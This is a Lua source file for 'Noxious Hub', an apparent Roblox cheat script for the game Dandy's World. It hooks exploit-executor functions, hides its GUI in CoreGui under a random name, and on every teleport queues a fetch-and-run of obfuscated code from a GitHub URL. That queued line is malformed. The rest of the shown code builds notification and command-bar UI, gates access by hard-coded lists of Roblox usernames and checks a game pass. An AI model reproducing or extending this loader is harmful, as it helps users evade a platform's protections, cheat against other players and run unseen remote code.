--[[---------------------------------------------------------------------------------------------------------------------------
  __   __     ______     __  __     __     ______     __  __     ______    
 /\ "-.\ \   /\  __ \   /\_\_\_\   /\ \   /\  __ \   /\ \/\ \   /\  ___\   
 \ \ \-.  \  \ \ \/\ \  \/_/\_\/_  \ \ \  \ \ \/\ \  \ \ \_\ \  \ \___  \  
  \ \_\\"\_\  \ \_____\   /\_\/\_\  \ \_\  \ \_____\  \ \_____\  \/\_____\ 
   \/_/ \/_/   \/_____/   \/_/\/_/   \/_/   \/_____/   \/_____/   \/_____/
   
   Made by Team Noxious and Plethora -- Dandy's World [Test version 7.7.2]   

---------------------------------------------------------------------------------------------------------------------------]]--

if _G.dswdnoxiousloaded == true then return end _G.dswdnoxiousloaded = true

-------------------------------------------------------------------------------------------------------------------------------

wait(0.1) local noxious = {}

-------------------------------------------------------------------------------------------------------------------------------

noxious["version"] = "7.7.2 Test"
noxious["uses"] = "334.5K"

noxious["dandy's world lobby"] = 16116270224
noxious["dandy's world run"] = 16552821455
noxious["dandy's world roleplay server"] = 18984416148
noxious["test game"] = 118022198489171

noxious["loaded"] = false

-------------------------------------------------------------------------------------------------------------------------------

noxious["click sound"] = Instance.new"Sound"
noxious["click sound"].SoundId = "rbxassetid://421058925"
noxious["click sound"].Parent = workspace
noxious["click sound"].Volume = 0.4

-------------------------------------------------------------------------------------------------------------------------------

function randomstring(l)
	local characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	local result = ""
	for i = 1, l do
		local randomIndex = math.random(1, #characters)
		result = result .. string.sub(characters, randomIndex, randomIndex)
	end
	return result
end

function randomstring2(l)
	local characters = "AÀÁÂÃÄÅĀĂĄǍǺȀȂȦȺᴀaàáâãäåāăąǎǻȁȃȧⱥBḂḄḆƀƁƂƃɓʙbḃḅḇƀƂƃɓCÇĆĈĊČƇƈȻȼʗcçćĉċčƈȼʗDÐĎĐḊḌḎḐḒƉƊƋƌȡʙdðďđḋḍḏḑḓƌȡEÈÉÊËĒĔĖĘĚȄȆȨɆɛeèéêëēĕėęěȅȇȩɇɛFḞƑƒfḟƒGĜĞĠĢǦǴƓƔʛgĝğġģǧǵɠɣHĤĦḢḤḦḨḪȞʜhĥħḣḥḧḩḫȟIÌÍÎÏĨĪĬĮİǏȈȊɨɩiìíîïĩīĭįıǐȉȋɨɩJĴɈɉʝjĵɉʝKĶḰḲḴƘƙʞkķḱḳḵƙʞLĹĻĽĿŁḶḸḺḼƚƛʟlĺļľŀłḷḹḻḽƚƛMḾṀṂƜɱmḿṁṃɯɱNÑŃŅŇŊṄṆṈṊƝƞɲɳnñńņňŋṅṇṉṋƞɲɳOÒÓÔÕÖØŌŎŐǑȌȎȪȬȮȰƆɵoòóôõöøōŏőǒȍȏȫȭȯȱɔɵPṔṖƤƥʠpṕṗƥQɊɋʠqɋʠRŔŖŘȐȒṘṚṜṞʀʁrŕŗřȑȓṙṛṝṟʀʁSŚŜŞŠȘṠṢṤṦṨʂsśŝşšșṡṣṥṧṩʂTŢŤȚṪṬṮṰŦƬƮʈtţťțṫṭṯṱŧƭƮʈUÙÚÛÜŨŪŬŮŰŲǓȔȖʉʊuùúûüũūŭůűųǔȕȗʉʊVṼṾƲʋvṽṿʋWẀẂẄŴẆẈʍwẁẃẅŵẇẉʍXẊẌχxẋẍχYÝŶŸȲɎʏyýŷÿȳɏʏZŹŻŽƵƶʐʑzźżžƶʐʑ~!@#$%^&*()_+{}:'|<>?`-=[];\,./"
	local result = ""
	for i = 1, l do
		local randomIndex = math.random(1, #characters)
		result = result .. string.sub(characters, randomIndex, randomIndex)
	end
	return result
end

-------------------------------------------------------------------------------------------------------------------------------

noxious["noxious screen gui"] = Instance.new("ScreenGui")
noxious["noxious screen gui"].Name = randomstring2(50)
noxious["noxious screen gui"].ResetOnSpawn = false

if game.PlaceId == noxious["test game"] then
	noxious["noxious screen gui"].Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
else
	noxious["noxious screen gui"].Parent = game:GetService("CoreGui")
end

local _= noxious["noxious screen gui"].Name

local mainframe = Instance.new("Frame")
local mainframe2 = Instance.new("Frame")

noxious["default white color"] = Color3.new(1, 1, 1)
noxious["default image color"] = Color3.new(1, 1, 1)
noxious["default gray color"] = Color3.new(0.5, 0.5, 0.5)
noxious["default black color"] = Color3.new(0, 0, 0)

-------------------------------------------------------------------------------------------------------------------------------

noxious["user input service"] = game:GetService("UserInputService")
noxious["run service"] = game:GetService("RunService")
noxious["tween service"] = game:GetService("TweenService")
noxious["http service"] = game:GetService("HttpService")
noxious["marketplace service"] = game:GetService("MarketplaceService")

noxious["player gui"] = noxious["noxious screen gui"].Parent
noxious["players"] = game:GetService("Players")
noxious["local player"] = noxious["players"].LocalPlayer

queueteleport = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)

noxious["players"].LocalPlayer.OnTeleport:Connect(function(State)
	queueteleport([[https://raw.githubusercontent.com/meowsynther/team-noxious-obfuscated/refs/heads/main/dandy's%20world/developer/%5Bobf%5D%20%5Btest%5D%20noxious%20hub.lua"))()]])
end)

-------------------------------------------------------------------------------------------------------------------------------

noxious["admins"] = { "stupiddum8ball", "ProchaineStation", "unaqle", "uwunable", "CerebralAneurysms", "stupiddumbpastry", "StrikerRode", "noxiousholder", "ihatedandysword", "DWNoxiousTester", "hxpxotic", "exherxal", "Plectora", "furbound", "9sght", "protogenfemboys", "BellasPerspective", "franticboxten", "NoxiousTester1", "NoxiousTester2", "NoxiousTester3", "stupiddumbfishbowl", "c00lunable", "cnutboyastro", "cnutboycosmo", "BellAss1232", "stupiddumbmusicalbox", "fembeyboxten", "stupiddumbrollcake" }

noxious["unable"] = { "unaqle", "c00lunable", "stupiddumbmusicalbox", "uwunable", "CerebralAneurysms" }
noxious["undercover unable"] = { "unab_e", "quwuelver", "BoxtomBotten", "Boxtom_Botten", }

noxious["ace"] = { "stupiddumbfishbowl", "my_otheraccisgonee", "my_otheraccisgone1", "stupiddum8ball", }

noxious["premium users"] = { "supernicew0lf", "ProchaineStation", "fullboxtened", "banESCAPED", "meowsynther", "unaqle", "edgarfunky", "LittleHulkshaver", "astro_thenumber1", "grtgrtrtgrt1", "StrikerRode", "CC54PHTQB4", "O6x5k", "imhackdandy3", "LITTLE_Runner111", "hola43i", "DysfunctionAhhDih69", "Fobeoas", "Sasarealsmooth0", "DANDYSBINMOD", "W4gyued", "MallowAlola", "dishwasherrinsecycle", "mallowsthirdalt", "TeaganSkinnyFan", "testaccountnumber834", "skibidiandandlol", "overoveroveragainWHY", "Pebbletherockala", "NpcHunter453", "1_S0up70", "esdfdxg22", "fakk69facc69", "ibWPQUHaINSaNe531", "1S0up10", "Calmyourcheeks14", "hitzuga", "maximoracca", "SupahCalifragilist", "SupahBerd", "mysubmarineimploded", "Supah_Berd", "qwelvercalled", "ilovedwsqwelver", "stuffisreallyreal", "SOMERANDOMTESTACC_XD", "ILOVEDANDYSWORLDDDX", "ethan14801", "n0e728", "lifeis_happiness3", "ibnuhaikyuu", "ibnuskibididop", "ibnuskibididop1", "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "ProchaineStation", "howuseenme", "bubtygames", "meowsynther", "LITTLE_Runner111", "localhttpget", "im_veryspiteful", "grtgrtrtgrt1", "noxioustester29", "absoloutedummy", "unab_e", "RSDandysWorld", "uwunable", "CerebralAneurysms", "stupiddumbpastry", "StrikerRode", "noxiousholder", "ihatedandysword", "DWNoxiousTester", "hxpxotic", "exherxal", "Plectora", "furbound", "9sght", "protogenfemboys", "BellasPerspective", "franticboxten", "NoxiousTester1", "NoxiousTester2", "NoxiousTester3", "stupiddumbfishbowl", "c00lunable", "cnutboyastro", "cnutboycosmo", "BellAss1232", "stupiddumbmusicalbox", "fembeyboxten", "stupiddumbrollcake", "mysubmarineimploded" }
noxious["testers"] = { "tssogurt", "supernicew0lf", "ProchaineStation", "fullboxtened", "banESCAPED", "meowsynther", "unaqle", "edgarfunky", "LittleHulkshaver", "astro_thenumber1", "grtgrtrtgrt1", "StrikerRode", "CC54PHTQB4", "O6x5k", "imhackdandy3", "LITTLE_Runner111", "hola43i", "DysfunctionAhhDih69", "Fobeoas", "Sasarealsmooth0", "DANDYSBINMOD", "W4gyued", "MallowAlola", "dishwasherrinsecycle", "mallowsthirdalt", "TeaganSkinnyFan", "testaccountnumber834", "skibidiandandlol", "overoveroveragainWHY", "Pebbletherockala", "NpcHunter453", "1_S0up70", "esdfdxg22", "fakk69facc69", "ibWPQUHaINSaNe531", "1S0up10", "Calmyourcheeks14", "hitzuga", "maximoracca", "SupahCalifragilist", "SupahBerd", "mysubmarineimploded", "Supah_Berd", "qwelvercalled", "ilovedwsqwelver", "stuffisreallyreal", "SOMERANDOMTESTACC_XD", "ILOVEDANDYSWORLDDDX", "ethan14801", "n0e728", "lifeis_happiness3", "ibnuhaikyuu", "ibnuskibididop", "ibnuskibididop1", }

noxious["cosmo orbiter"] = { "overoveroveragainWHY", "stupiddumbrollcake", "stupiddumbpastry", "CosmoLovver", "CosmoLovvver" }
noxious["shrimpo orbiter"] = { "eggydropkick", "TheLostTwentyNine", "edgarfunky", "javierre14", "Loongies23", "masterMingTheCool", "ihatedandysword", "UwUunicornPrincess1o", "NpcHunter453", "MaxwellTheKitty1", "Maddi_ealala" }

noxious["qwelver"] = { "Qwelver" }

-------------------------------------------------------------------------------------------------------------------------------

local id = 1085884381

local marketplaceservice = game:GetService("MarketplaceService")
if marketplaceservice:UserOwnsGamePassAsync(noxious["local player"].UserId, id) then
	table.insert(noxious["premium users"], noxious["local player"].Name)
	wait()
	table.insert(noxious["premium users"], noxious["local player"].Name)
	wait()
	table.insert(noxious["premium users"], noxious["local player"].Name)
	wait()
	table.insert(noxious["premium users"], noxious["local player"].Name)
	wait()
	table.insert(noxious["premium users"], noxious["local player"].Name)
	wait()
	table.insert(noxious["premium users"], noxious["local player"].Name)
	wait()
	table.insert(noxious["premium users"], noxious["local player"].Name)
	wait()
	table.insert(noxious["premium users"], noxious["local player"].Name)
end

wait(0.5)

-------------------------------------------------------------------------------------------------------------------------------

function istester(username)
	for _, dev in ipairs(noxious["testers"]) do
		if dev == username then
			return true
		end
	end
	return false
end

function isnottester(username)
	for _, dev in ipairs(noxious["testers"]) do
		if dev == username then
			return false
		end
	end
	return true
end

-- Prevent code below if the player isnt a tester
if isnottester(noxious["local player"].Name) then
	return
end

-------------------------------------------------------------------------------------------------------------------------------

function iscosmo(username)
	for _, dev in ipairs(noxious["cosmo orbiter"]) do
		if dev == username then
			return true
		end
	end
	return false
end

function isunable(username)
	for _, dev in ipairs(noxious["unable"]) do
		if dev == username then
			return true
		end
	end
	return false
end

function isace(username)
	for _, dev in ipairs(noxious["ace"]) do
		if dev == username then
			return true
		end
	end
	return false
end

function undercover(username)
	for _, dev in ipairs(noxious["undercover unable"]) do
		if dev == username then
			return true
		end
	end
	return false
end

function premiumuser(username)
	for _, dev in ipairs(noxious["premium users"]) do
		if dev == username then
			return true
		end
	end
	return false
end

-------------------------------------------------------------------------------------------------------------------------------

noxious["active notifications"] = {}

noxious["notification sound"] = "rbxassetid://8503529139"
noxious["error sound"] = "rbxassetid://489103549"
noxious["warning sound"] = "rbxassetid://5914602124"

local function notify(message, duration, variant)
	local borderColor = noxious["default white color"]
	local textColor = noxious["default white color"]
	local timerframecolor = noxious["default white color"]
	local playbackspeed = 1
	local topframetext = "Notify / Noxious Hub: Dandy's World"

	if variant == "unableishere" then
		topframetext = "Special / Noxious Hub: Dandy's World"
		borderColor = Color3.new(0.2, 0.2, 1)
		textColor = Color3.new(0.2, 0.2, 1)
		timerframecolor = Color3.new(0.2, 0.2, 1)
		playbackspeed = 0.7
	end

	if variant == "aceishere" then
		topframetext = "Special / Noxious Hub: Dandy's World"
		borderColor = Color3.fromRGB(156, 175, 136)
		textColor = Color3.fromRGB(156, 175, 136)
		timerframecolor = Color3.fromRGB(156, 175, 136)
		playbackspeed = 0.7
	end

	if variant == "tmishere" then
		topframetext = "Special / Noxious Hub: Dandy's World"
		borderColor = Color3.new(0.5, 0.5, 0.5)
		textColor = Color3.new(0.5, 0.5, 0.5)
		timerframecolor = Color3.new(0.5, 0.5, 0.5)
		playbackspeed = 0.7
	end

	if variant == "qwelverishere" then
		topframetext = "Special / Noxious Hub: Dandy's World"
		borderColor = Color3.new(1, 0.4, 1)
		textColor = Color3.new(1, 0.4, 1)
		timerframecolor = Color3.new(1, 0.4, 1)
		playbackspeed = 0.7
	end

	local notifsound = Instance.new("Sound")
	notifsound.SoundId = noxious["notification sound"]
	notifsound.PlaybackSpeed = playbackspeed
	notifsound.Parent = noxious["toggle interface visibility button"]
	notifsound.Volume = 2

	if variant == "error" then
		borderColor = Color3.new(1, 0.3, 0.3)
		textColor = Color3.new(1, 0.3, 0.3)
		topframetext = "Error / Noxious Hub: Dandy's World"
		timerframecolor = Color3.new(1, 0.3, 0.3)
		notifsound.SoundId = noxious["error sound"]
		notifsound.Volume = 1.6
		notifsound.TimePosition = 0.05
		notifsound.PlaybackSpeed = 0.8
	end

	if variant == "warning" then
		borderColor = Color3.new(1, 1, 0.4)
		topframetext = "Warning / Noxious Hub: Dandy's World"
		textColor = Color3.new(1, 1, 0.4)
		timerframecolor = Color3.new(1, 1, 0.4)
		notifsound.SoundId = noxious["warning sound"]
		notifsound.Volume = 1
		notifsound.TimePosition = 0.2
		notifsound.PlaybackSpeed = 0.8
	end

	local scale = 0.85

	local notifframe = Instance.new("Frame")
	notifframe.Name = "block"
	notifframe.Size = UDim2.new(0, 390 * scale, 0, 90 * scale)
	notifframe.Position = UDim2.new(1, 500 * scale, 1, -10 * scale)
	notifframe.AnchorPoint = Vector2.new(1, 1)
	notifframe.BackgroundColor3 = noxious["default black color"]
	notifframe.BackgroundTransparency = 0.2
	notifframe.BorderColor3 = borderColor
	notifframe.BorderSizePixel = 1
	notifframe.Parent = noxious["noxious screen gui"]

	local notiftopframe = Instance.new("Frame")
	notiftopframe.Name = "block"
	notiftopframe.Size = UDim2.new(1, 0, 0, 24 * scale)
	notiftopframe.Position = UDim2.new(0, 0, 0, 0)
	notiftopframe.BackgroundColor3 = noxious["default black color"]
	notiftopframe.BackgroundTransparency = 0.2
	notiftopframe.BorderColor3 = borderColor
	notiftopframe.BorderSizePixel = 1
	notiftopframe.Parent = notifframe

	local notifytopframetxt = Instance.new("TextLabel")
	notifytopframetxt.Name = "block"
	notifytopframetxt.Size = UDim2.new(1, -10 * scale, 1, 0)
	notifytopframetxt.Position = UDim2.new(0, 5 * scale, 0, -0.6)
	notifytopframetxt.BackgroundTransparency = 1
	notifytopframetxt.TextColor3 = textColor
	notifytopframetxt.Text = topframetext
	notifytopframetxt.Font = Enum.Font.Nunito
	notifytopframetxt.TextSize = 21.6 * scale
	notifytopframetxt.TextScaled = false
	notifytopframetxt.TextXAlignment = Enum.TextXAlignment.Left
	notifytopframetxt.Parent = notiftopframe

	local closenotif = Instance.new("TextButton")
	closenotif.Name = "block"
	closenotif.Size = UDim2.new(0, 23 * scale, 0, 23 * scale)
	closenotif.Position = UDim2.new(1, -23 * scale, 0, 0)
	closenotif.BackgroundColor3 = noxious["default black color"]
	closenotif.BorderSizePixel = 0
	closenotif.BorderColor3 = borderColor
	closenotif.BackgroundTransparency = 0
	closenotif.Text = "X"
	closenotif.Font = Enum.Font.Nunito
	closenotif.TextColor3 = textColor
	closenotif.TextSize = 20 * scale
	closenotif.Parent = notiftopframe
	closenotif.MouseButton1Click:Connect(function()
		noxious["click sound"]:Play()
	end)

	local closenotiftxtp = Instance.new"UIPadding"
	closenotiftxtp.PaddingTop = UDim.new(0, 1)
	closenotiftxtp.PaddingLeft = UDim.new(0, 1)
	closenotiftxtp.Parent = closenotif

	local notiftimerframe = Instance.new("Frame")
	notiftimerframe.Name = "block"
	notiftimerframe.Size = UDim2.new(0, 390 * scale, 0, 6 * scale)
	notiftimerframe.Position = UDim2.new(0, 0, 0, 25 * scale)
	notiftimerframe.BackgroundColor3 = noxious["default black color"]
	notiftimerframe.BorderColor3 = borderColor
	notiftimerframe.BorderSizePixel = 1
	notiftimerframe.BackgroundTransparency = 0
	notiftimerframe.Parent = notifframe

	local notiftimer = Instance.new("Frame")
	notiftimer.Name = "block"
	notiftimer.Size = UDim2.new(1, 0, 1, 0)
	notiftimer.Position = UDim2.new(0, 0, 0, 0)
	notiftimer.BackgroundColor3 = timerframecolor
	notiftimer.BorderSizePixel = 0
	notiftimer.BackgroundTransparency = 0.5
	notiftimer.Parent = notiftimerframe

	local notiftxt = Instance.new("TextLabel")
	notiftxt.Name = "block"
	notiftxt.Size = UDim2.new(0.97, -9 * scale, 0, 64 * scale)
	notiftxt.Position = UDim2.new(0, 10 * scale, 0, 29 * scale)
	notiftxt.BackgroundTransparency = 1
	notiftxt.TextColor3 = textColor
	notiftxt.Text = message
	notiftxt.Font = Enum.Font.Nunito
	notiftxt.TextSize = 21.6 * scale
	notiftxt.TextScaled = false
	notiftxt.TextWrapped = true
	notiftxt.TextXAlignment = Enum.TextXAlignment.Left
	notiftxt.Parent = notifframe

	closenotif.ZIndex = 140
	notiftimer.ZIndex = 139
	notifytopframetxt.ZIndex = 139
	notiftxt.ZIndex = 138
	notiftimerframe.ZIndex = 138
	notiftopframe.ZIndex = 138
	notifframe.ZIndex = 137

	TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut)
	notifsound:Play()

	if variant == "unableishere" or variant == "qwelverishere" or variant == "plethoraishere" or variant == "tmishere" or variant == "aceishere" then
		local blueSound = Instance.new("Sound")
		blueSound.SoundId = "rbxassetid://836142578"
		blueSound.Volume = 0.9
		blueSound.Parent = noxious["toggle interface visibility button"]
		blueSound.PlaybackSpeed = 0.9
		blueSound.TimePosition = 0.0613
		blueSound:Play()
		blueSound.Ended:Connect(function()
			blueSound:Destroy()
		end)
	end

	local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut)
	notifsound:Play()

	table.insert(noxious["active notifications"], 1, notifframe)

	for i, frame in ipairs(noxious["active notifications"]) do
		local newTargetPosition = UDim2.new(1, -10 * scale, 1, -10 * scale - ((i - 1) * 100 * scale))
		local adjustTween = noxious["tween service"]:Create(
			frame,
			TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
			{Position = newTargetPosition}
		)
		adjustTween:Play()
	end

	local slideInTween = noxious["tween service"]:Create(notifframe, tweenInfo, {Position = UDim2.new(1, -10 * scale, 1, -10 * scale)})
	slideInTween:Play()

	local barTweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Linear, Enum.EasingDirection.Out)
	local barTween = noxious["tween service"]:Create(notiftimer, barTweenInfo, {Size = UDim2.new(0, 0, 1, 0)})
	barTween:Play()

	local function closenotiffunc()
		if not notifframe.Parent then return end

		barTween:Cancel()

		local slideOutTween = noxious["tween service"]:Create(
			notifframe,
			tweenInfo,
			{Position = UDim2.new(1, 450 * scale, notifframe.Position.Y.Scale, notifframe.Position.Y.Offset)}
		)
		slideOutTween:Play()

		slideOutTween.Completed:Connect(function()
			if notifframe.Parent then
				notifframe:Destroy()
			end
			for i, frame in ipairs(noxious["active notifications"]) do
				if frame == notifframe then
					table.remove(noxious["active notifications"], i)
					break
				end
			end
			for i, frame in ipairs(noxious["active notifications"]) do
				local newTargetPosition = UDim2.new(1, -10 * scale, 1, -10 * scale - ((i - 1) * 100 * scale))
				local adjustTween = noxious["tween service"]:Create(
					frame,
					TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
					{Position = newTargetPosition}
				)
				adjustTween:Play()
			end
		end)
	end

	closenotif.MouseButton1Click:Connect(closenotiffunc)

	spawn(function()
		wait(duration)
		if notifframe.Parent then
			closenotiffunc()
		end
	end)

	if variant == "unableishere" or variant == "qwelverishere" or variant == "plethoraishere" or variant == "tmishere" or variant == "aceishere" or variant == "error" or variant == "warning" then
		local colorTweenInfo = TweenInfo.new(2, Enum.EasingStyle.Linear, Enum.EasingDirection.Out)

		local borderColorTween = noxious["tween service"]:Create(notiftopframe, colorTweenInfo, {BorderColor3 = Color3.new(1, 1, 1)})
		local borderColorTween2 = noxious["tween service"]:Create(notifframe, colorTweenInfo, {BorderColor3 = Color3.new(1, 1, 1)})
		local borderColorTween3 = noxious["tween service"]:Create(closenotif, colorTweenInfo, {BorderColor3 = Color3.new(1, 1, 1)})
		local borderColorTween4 = noxious["tween service"]:Create(notiftimerframe, colorTweenInfo, {BorderColor3 = Color3.new(1, 1, 1)})
		local textColorTween = noxious["tween service"]:Create(notiftxt, colorTweenInfo, {TextColor3 = Color3.new(1, 1, 1)})
		local textColorTween2 = noxious["tween service"]:Create(notifytopframetxt, colorTweenInfo, {TextColor3 = Color3.new(1, 1, 1)})
		local textColorTween3 = noxious["tween service"]:Create(closenotif, colorTweenInfo, {TextColor3 = Color3.new(1, 1, 1)})
		local timerColorTween = noxious["tween service"]:Create(notiftimer, colorTweenInfo, {BackgroundColor3 = Color3.new(1, 1, 1)})

		borderColorTween:Play()
		borderColorTween2:Play()
		borderColorTween3:Play()
		borderColorTween4:Play()
		textColorTween:Play()
		textColorTween2:Play()
		textColorTween3:Play()
		timerColorTween:Play()
	end
end

function closeallnotifs()
	for _, frame in ipairs(noxious["active notifications"]) do
		if frame and frame.Parent then
			local slideOutTween = noxious["tween service"]:Create(
				frame,
				TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut),
				{Position = UDim2.new(1, 350, frame.Position.Y.Scale, frame.Position.Y.Offset)}
			)
			slideOutTween:Play()

			slideOutTween.Completed:Connect(function()
				if frame.Parent then
					frame:Destroy()
				end
			end)
		end
	end

	noxious["active notifications"] = {}
end

-------------------------------------------------------------------------------------------------------------------------------

noxious["toggle interface visibility button"] = Instance.new("ImageButton")
noxious["toggle interface visibility button"].Name = ("NoxiousButton")
noxious["toggle interface visibility button"].Size = UDim2.new(0, 48, 0, 48)
noxious["toggle interface visibility button"].BorderSizePixel = 0
noxious["toggle interface visibility button"].BorderColor3 = noxious["default white color"]
noxious["toggle interface visibility button"].ImageColor3 = noxious["default white color"]
noxious["toggle interface visibility button"].Visible = false
noxious["toggle interface visibility button"].Parent = noxious["noxious screen gui"]
noxious["toggle interface visibility button"].Image = "rbxassetid://130584446591314"
noxious["toggle interface visibility button"].ImageColor3 = noxious["default image color"]

function movebutton()
	local screenWidth = game:GetService"Workspace".CurrentCamera.ViewportSize.X

	local buttonWidth = 48

	local centerX = (screenWidth - buttonWidth) / 2
	local topMargin = 20
	local centerY = topMargin

	noxious["toggle interface visibility button"].Position = UDim2.new(0, centerX, 0, centerY - 150)

	local offsetY = 150
	local targetPosition = UDim2.new(0, centerX, 0, centerY - offsetY)

	local tweenInfoUp = TweenInfo.new(0, Enum.EasingStyle.Back, Enum.EasingDirection.Out, 0, false, 0)

	local tweenUp = noxious["tween service"]:Create(noxious["toggle interface visibility button"], tweenInfoUp, {Position = targetPosition})

	local function moveButtonBack()
		local tweenInfoDown = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out, 0, false, 0)

		local tweenDown = noxious["tween service"]:Create(noxious["toggle interface visibility button"], tweenInfoDown, {Position = UDim2.new(0, centerX, 0, centerY)})

		tweenDown:Play()
	end

	noxious["toggle interface visibility button"].Visible = true
	tweenUp:Play()

	tweenUp.Completed:Wait()
	moveButtonBack()
end

noxious["tivb ui rounded corner"] = Instance.new"UICorner"
noxious["tivb ui rounded corner"].CornerRadius = UDim.new(0.3, 0)
noxious["tivb ui rounded corner"].Parent = noxious["toggle interface visibility button"]

noxious["tivb border"] = Instance.new"Frame"
noxious["tivb border"].Size = UDim2.new(0, 50, 0, 50)
noxious["tivb border"].Position = UDim2.new(-2E-2, 0, -2E-2, 0)
noxious["tivb border"].BackgroundColor3 = noxious["default white color"]
noxious["tivb border"].Parent = noxious["toggle interface visibility button"]

noxious["tivb border ui rounded corner"] = Instance.new"UICorner"
noxious["tivb border ui rounded corner"].CornerRadius = UDim.new(0.3, 0)
noxious["tivb border ui rounded corner"].Parent = noxious["tivb border"]

function dragbutton()
	local frame = noxious["toggle interface visibility button"]
	local dragToggle 	
	local dragSpeed = 0.25
	local dragStart 	
	local startPos 

	local function updatebuttoninput(input)
		local delta = input.Position - dragStart
		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		game:GetService'TweenService':Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
	end

	frame.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
			dragToggle = true
			dragStart = input.Position
			startPos = frame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)

	noxious["user input service"].InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			if dragToggle then
				updatebuttoninput(input)
			end
		end
	end)
end

function addgradient()
	local gradient = Instance.new"UIGradient"	
	gradient.Color =
		ColorSequence.new {
			ColorSequenceKeypoint.new(0, noxious["default white color"]),
			ColorSequenceKeypoint.new(0.5, noxious["default black color"]),
			ColorSequenceKeypoint.new(1, noxious["default white color"])
		}
	gradient.Parent = noxious["tivb border"]

	local rotationSpeed = 1
	task.spawn(
		function()
			while true do
				gradient.Rotation = (gradient.Rotation + rotationSpeed) % 360
				task.wait(0.03)
			end
		end
	)
end

dragbutton()
addgradient()

-------------------------------------------------------------------------------------------------------------------------------

local canrepos = false

mainframe.Name = "mainframe"
mainframe.Size = UDim2.new(0, 594, 0, 330)
mainframe.BackgroundColor3 = noxious["default black color"]
mainframe.BorderSizePixel = 1
mainframe.BorderColor3 = noxious["default white color"]
mainframe.BackgroundTransparency = 0.2
mainframe.Parent = noxious["noxious screen gui"]
mainframe.Visible = true
mainframe.Position = UDim2.new(0, 0, 0, 1000)

function centermainframe()
	if canrepos == false then return end
	local screenWidth = game:GetService"Workspace".CurrentCamera.ViewportSize.X
	local screenHeight = game:GetService"Workspace".CurrentCamera.ViewportSize.Y

	local frameWidth = 594
	local frameHeight = 330
	local centerX = (screenWidth - frameWidth) / 2
	local centerY = (screenHeight - frameHeight) / 2 - 58

	mainframe.Position = UDim2.new(0, centerX, 0, centerY)
end
centermainframe()

function tweenmainframe()
	local camera = workspace.CurrentCamera
	local screenSize = camera.ViewportSize

	local frameWidth = 594
	local frameHeight = 330
	local centerX = (screenSize.X - frameWidth) / 2
	local centerY = (screenSize.Y - frameHeight) / 2 - 58
	local bottomY = (screenSize.Y - frameHeight) / 2 + 600

	mainframe.Position = UDim2.new(0, centerX, 0, bottomY)

	local targetPosition = UDim2.new(0, centerX, 0, centerY)

	local tweenInfo = TweenInfo.new(
		1, -- Time
		Enum.EasingStyle.Back,
		Enum.EasingDirection.Out
	)

	local tween = noxious["tween service"]:Create(mainframe, tweenInfo, {
		Position = targetPosition
	})

	tween:Play()
	canrepos = true
end

function dragmainframe()
	local frame = mainframe
	local dragToggle 	
	local dragSpeed = 0.25
	local dragStart 	
	local startPos 

	local function updatemainframeinput(input)
		local delta = input.Position - dragStart
		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		game:GetService'TweenService':Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
	end

	frame.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
			dragToggle = true
			dragStart = input.Position
			startPos = frame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)

	noxious["user input service"].InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			if dragToggle then
				updatemainframeinput(input)
			end
		end
	end)
end
dragmainframe()

-------------------------------------------------------------------------------------------------------------------------------

noxious["command bar max characters"] = 60

noxious["command bar"] = Instance.new"TextBox"
noxious["command bar"].Size = UDim2.new(0, 297, 0, 52.8)
noxious["command bar"].Position = UDim2.new(0, 0, 0.7, 54)
noxious["command bar"].PlaceholderText = "Type command here..."
noxious["command bar"].PlaceholderColor3 = noxious["default gray color"]
noxious["command bar"].Text = ""
noxious["command bar"].Font = Enum.Font.Nunito
noxious["command bar"].BackgroundColor3 = noxious["default black color"]
noxious["command bar"].TextColor3 = noxious["default white color"]
noxious["command bar"].BorderColor3 = noxious["default white color"]
noxious["command bar"].BorderSizePixel = 1
noxious["command bar"].TextXAlignment = Enum.TextXAlignment.Left
noxious["command bar"].TextSize = 21.6
noxious["command bar"].TextWrapped = false
noxious["command bar"].TextScaled = false
noxious["command bar"].Parent = mainframe
noxious["command bar"].ClipsDescendants = true

noxious["command bar text padding"] = Instance.new"UIPadding"
noxious["command bar text padding"].PaddingLeft = UDim.new(0, 13)
noxious["command bar text padding"].PaddingRight = UDim.new(0, 57)
noxious["command bar text padding"].Parent = noxious["command bar"]

local ptcleartextbox = true

function updclrtxt()
	noxious["command bar"].ClearTextOnFocus = ptcleartextbox
end

spawn(updclrtxt)

noxious["command bar"]:GetPropertyChangedSignal"Text":Connect(function()
	if #noxious["command bar"].Text > noxious["command bar max characters"] then
		noxious["command bar"].Text = noxious["command bar"].Text:sub(1, noxious["command bar max characters"])
	end
end)

